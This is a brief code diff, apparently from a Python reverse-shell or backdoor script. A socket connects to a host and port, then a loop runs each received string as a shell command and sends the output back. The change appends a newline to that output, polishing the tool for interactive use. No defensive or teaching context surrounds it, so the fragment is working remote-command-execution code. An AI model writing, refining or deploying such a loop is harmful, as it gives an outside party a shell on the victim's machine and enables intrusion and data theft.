@@ -11,5 +11,5 @@ sock.connect((host, port))
 
 while True:
     command = sock.recv(1024).decode()
-    output = subprocess.getoutput(command)
+    output = subprocess.getoutput(command) + '\n'
     sock.send(output.encode())
